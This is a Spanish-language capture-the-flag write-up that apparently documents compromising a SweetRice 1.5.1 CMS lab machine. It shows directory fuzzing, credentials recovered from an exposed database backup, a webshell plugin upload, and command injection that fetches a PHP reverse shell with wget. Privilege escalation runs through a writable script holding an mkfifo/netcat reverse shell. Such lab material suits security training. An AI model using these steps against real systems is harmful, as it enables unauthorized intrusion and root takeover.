Buena máquina. Se aprende bastante sobre webshells

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Hacerlo de estas 2 formas:
	1-https://github.com/p0dalirius/SweetRice-webshell-plugin/tree/master?tab=readme-ov-file
	2-https://www.youtube.com/watch?v=-tVEDWYE9Jg&list=PLP_1J39OfjVjmve9HyZtY6i4v2sYuM3rr&index=7

-Hacemos enumeración web con ffuf:
	ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.183.75
		/content
	ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.183.75/content/FUZZ -fc 200
	Ponemos -fc 200 para excluir las respuestas cuyo estado sea 200, ya que salía mucha info que no era relevante.

-En las siguientes rutas encontramos información relevante:
	-/content: Encontramos un CMS llamado SweetRice. 
	-/content/inc/latest.txt: Encontramos la versión 1.5.1.
	-/content/inc/mysqlbackup/mysql_bakup_20191129023059-1.5.1.sql: Encontramos un fichero .sql con el user --> manager y la password --> Password123

-En la siguiente ruta podemos autenticarnos con las credenciales obtenidas:
	/content/as
	user: manager
	passwd: Password123

-Vamos a explotar el CMS SweetRice version 1.5.1 de dos maneras diferentes:
	1-Subimos una webshell en plugins
	2-Analizamos exploit en Python y lo hacemos manual

1-Subimos una webshell en plugins
	Paso 1: subir la webshell como plugin:
		Plugin List --> Browse: SweetRice-WebShell-plugin/dist/webshell.zip -->Done
		Instalamos el plugin: Install
	Paso 2: Vamos a la siguiente ruta para ejecutar comandos a través de la webshell:
		IP/content/_plugin/webshell/webshell.php?action=exec&cmd=id

-El comando curl está capado

-Para conseguir la reverse shell he encontrado 2 opciones:
	1-Subir un exploit.php (PentestMonkey), darle parmisos de ejecución y ejecutarla:
		-Para subir el fichero exploit.php tenemos que irnos al directorio /tmp, porque ahí tenemos permisos de escritura (w). Para ellos aplicamos Command Injection para ejecutar 2 comandos en secuencia:
			cd /tmp;wget http://IP/exploit.php
			-Tenemos que aplicar URL Encode a '+' , que es '%2B', para que lo interprete la URL: 
				chmod %2Bx /tmp/exploit.php
			-Ejecutamos el archivo con el intérprete php:
				ESTO FUNCIONA: php /tmp/exploit.php
				-IMPORTANTE: (El siguiente comando no funciona, ya que php no funciona como bash, haciendolo así lo estamos interpretando con nuestra máquina y no desde la máquina víctima):
					ESTO NO FUNCIONA: /tmp/exploit.php | php
	2-Ejecutamos una reverse shell desde la URL directamente. Me han funcionado las siguientes de reverse shell Generator:
		-Perl no sh
		-Python #1, Python #1 URL Encode, Python #2

2-Segunda forma de comprometer la máquina. Analizamos exploit en Python y lo hacemos manual:
	-Analizamos el exploit.py: El exploit te pide los parámetros user y passwd para autenticarse y file en formato php5 para subir el archivo malicioso. Dónde sube el archivo y dónde se puede ejecutar:
		-Ruta donde sube el archivo: uploadfile = r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)
		-Ruta dónde ejecutar el archivo desde URL: URL : http://" + host + "/attachment/" + filename)
	-Nos autenticamos manualmente y subimos el archivo .php5 (.php no funciona) en el apartado media center del dashboard.  Después nos vamos a IP/content/attachment/exploit.php5 y lo ejecutamos. Hemos recibido la revese shell con éxito.



## Escalada de Privilegios

-sudo -l:
	(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

-Observamos que hay dentro del fichero backup.pl:
	www-data@THM-Chal:/$ cat /home/itguy/backup.pl
	#!/usr/bin/perl
	system("sh", "/etc/copy.sh");

-El fichero backup.pl está ejecutando el fichero copy.sh, vamos a ver que hay dentro de copy.sh:
	www-data@THM-Chal:/etc$ cat copy.sh
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

-El fichero copy.sh contiene una reverse shell de mkfifo. Tenemos permisos de escritura, por lo que cambiamos la IP. Ejecutamos el archivo backup.pl como sudo, esto va a ejecutar el archivo copy.sh el cual nos va a mandar una reverse shell como root:
	www-data@THM-Chal:/etc$ sudo /usr/bin/perl /home/itguy/backup.pl
	connect to [10.9.2.165] from (UNKNOWN) [10.10.183.75] 45446
	# whoami
	root

